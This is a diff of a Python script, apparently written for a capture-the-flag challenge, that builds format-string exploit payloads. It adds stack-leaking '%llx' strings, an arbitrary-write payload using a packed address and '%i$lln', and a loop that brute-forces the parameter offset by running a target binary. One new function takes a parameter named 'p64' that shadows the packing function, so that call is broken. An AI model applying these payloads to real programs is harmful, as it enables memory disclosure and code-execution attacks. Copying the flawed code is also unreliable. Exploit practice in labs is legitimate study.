@@ -16,14 +16,14 @@ def param_enum(n):
     pld += " "
     pld += " ".join(["%llx"] * n)
 
-    return pld
+    p(pld)
 
 
 def write_64(s):
     pass
 
 
-def payload_1(n):
+def pld_leak(n):
     pld = "a" * 8
     pld += " "
     # pld += " ".join(["%llx"] * 11)
@@ -32,14 +32,21 @@ def payload_1(n):
     return pld
 
 
+def pld_1(i):
+    p(pld_leak(i))
+
+
 def param_bf(s, n):
     for i in range(1, n):
-        sp.call(["%s" % s, payload_1(i)])
+        sp.call(["%s" % s, pld_leak(i)])
         print("\ni=%i" % i)
 
 
-def payload_2(i):
-    pld = p64(0x6161616161616161)
+def pld_write(i, a=0xdeadbeeffeeddada, p64=True):
+    if p64:
+        pld = p64(a)
+    else:
+        pld = p32(a)
     # pld = p64(0x600e18)
     # pld += "%%0%ix"
     pld += "%%%i$lln" % i
@@ -47,16 +54,8 @@ def payload_2(i):
     return pld
 
 
-def a0(n):
-    p(param_enum(n))
-
-
-def a1(n):
-    p(payload_1(n))
-
-
-def a2(n):
-    p(payload_2(n))
+def pld_2(i, a=0xdeadbeeffeeddada, p64=True):
+    p(pld_write(i, a, p64))
 
 
 def main():
